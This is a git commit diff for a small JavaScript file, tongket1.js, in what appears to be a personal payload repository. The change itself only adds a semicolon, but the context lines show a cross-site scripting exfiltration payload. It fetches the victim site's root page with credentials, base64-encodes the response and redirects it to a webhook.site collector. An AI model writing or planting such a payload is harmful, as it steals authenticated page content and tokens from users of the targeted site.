993c045e4eb6a65bbe2e17da4396b0bb6132e65e
YoneD19 <53221480+YoneD19@users.noreply.github.com>
2022-09-06 10:33:33 +0700

    Update and rename tongket.js to tongket1.js

--- tongket1.js
+++ tongket1.js
@@ -3,6 +3,6 @@ req.open("GET","/",false);
 req.onreadystatechange = function(){
   var res = req.response;
   window.location = 'https://webhook.site/5714e407-e06e-49ba-a7fc-bff2e30c2104'+btoa(res);
-}
+};
 req.withCredentials = true;
 req.send();
